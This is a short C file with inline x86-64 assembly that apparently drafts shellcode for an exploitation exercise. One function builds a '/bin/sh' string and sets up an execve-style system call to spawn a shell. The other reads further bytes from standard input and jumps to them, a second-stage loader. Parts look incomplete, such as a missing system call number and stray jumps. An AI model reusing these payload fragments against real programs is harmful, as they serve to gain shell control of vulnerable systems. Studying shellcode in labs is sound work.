/*

gcc as.c -masm=intel
*/

#include<stdio.h>  
int func()  
{  
    char buf[100];
    long long res;  
    __asm__ (     
            ".intel_syntax noprefix\n"  
            "mov rcx, 0x68732f6e69622f\n"
	    "jmp rsp\n"
            "xor rsi,rsi\n"
            "xor rdx,rdx\n"
            "push rcx\n"                  
            "lea rdi, [rsp]\n"
            "syscall "
        :"=c"(res)      //output  
        :"m"(buf)    //input  
        :           //register that will be changed  
    );   


}  
int func1()  
{  
    char buf[100];
    long long res;  
    __asm__ (     
            ".intel_syntax noprefix\n"  
            "mov dl,0xff\n"  
            "mov rsi,rax\n"  
            "mov r10,rax\n"  
            "xor rdi,rdi\n"  
            "xor rax,rax\n"  
            "syscall\n"  
            "jmp r10\n"  
            "add r10,19\n"  
            "jmp r10\n"  
        :"=c"(res)      //output  
        :"m"(buf)    //input  
        :           //register that will be changed  
    );   


}  
int main()
{
	func();
}

